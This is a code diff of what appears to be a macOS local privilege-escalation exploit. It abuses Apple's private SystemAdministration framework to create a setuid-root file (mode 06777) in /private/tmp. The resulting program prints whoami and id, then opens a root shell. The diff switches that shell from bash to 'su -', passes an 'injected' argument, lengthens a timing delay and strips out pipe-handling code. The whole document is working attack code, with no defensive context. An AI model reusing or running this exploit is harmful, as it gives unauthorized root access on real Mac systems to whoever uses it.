@@ -10,8 +10,9 @@
 
 #define kSystemAdminFramework "/System/Library/PrivateFrameworks/SystemAdministration.framework/SystemAdministration"
 #define kFilePrefix           "/private/tmp/"
+#define kArgNoSu              "injected"
 #define kPOSIXPermissions     06777
-#define kWaitTime             1500
+#define kWaitTime             20000
 
 // Use new prototype
 extern void objc_msgSend(void);
@@ -33,7 +34,7 @@ int main(int argc, char *const *argv, char *const *environ)
         NSLog(@"Injected program running at %s [euid: %d, egid: %d]", argv[0], getuid(), getgid());
         printf("whoami: "); fflush(stdout); system("whoami");
         printf("id: "); fflush(stdout); system("id");
-        system("bash");
+        if (argc == 1) system("su -");
         exit(0);
     } else {
         void *handle = dlopen(kSystemAdminFramework, RTLD_NOW);
@@ -73,15 +74,8 @@ int main(int argc, char *const *argv, char *const *environ)
             exit(1);
         }
 
-        int iopipe[2];
         pid_t child;
         close(fd);
-
-        if (pipe(iopipe) == -1)
-        {
-            perror("pipe");
-            exit(1);
-        }
 
         if ((child = fork()) == -1)
         {
@@ -92,27 +86,8 @@ int main(int argc, char *const *argv, char *const *environ)
         switch (child)
         {
             case 0: {
-                // I AM the child, doofus
-                if (close(iopipe[0]) == -1)
-                {
-                    perror("close");
-                    exit(1);
-                }
-
-                if (dup2(STDIN_FILENO, iopipe[1]) == -1)
-                {
-                    perror("dup2");
-                    exit(1);
-                }
-
-                if (close(iopipe[1]) == -1)
-                {
-                    perror("close");
-                    exit(1);
-                }
-
                 NSLog(@"Executing %@ in %d microseconds...", path, kWaitTime); usleep(kWaitTime);
-                execve([path UTF8String], (char *const [2]){(char *)[path UTF8String], NULL}, environ);
+                execve([path UTF8String], (char *const [3]){(char *)[path UTF8String], kArgNoSu, NULL}, environ);
 
                 // If I'm here, we dun fukd up
                 perror("execve");
@@ -120,27 +95,8 @@ int main(int argc, char *const *argv, char *const *environ)
             } break;
             default: {
                 // I'm the parent :3
-                if (close(iopipe[1]) == -1)
-                {
-                    perror("close");
-                    exit(1);
-                }
-
-                FILE *cstream = fdopen(iopipe[0], "r");
-                if (!cstream) exit(2);
-
-                char *line = NULL;
-                ssize_t read = 0;
-
-                while (!feof(cstream) && !(read = getline(&line, NULL, cstream)))
-                {
-                    fprintf(stdout, "child: %s[%u]: %s\n", basename(argv[0]), child, line);
-                    free(line);
-                }
-
-                fclose(cstream);
                 pid_t waitproc = 0;
-
+                
                 while ((waitproc = wait3(NULL, WNOHANG, NULL)) != child)
                 {
                     if (waitproc == 0 || (waitproc == -1 && errno == ECHILD)) {
@@ -151,7 +107,7 @@ int main(int argc, char *const *argv, char *const *environ)
                         kill(child, SIGKILL);
                     }
                 }
-
+                
                 exit(0);
             } break;
         }
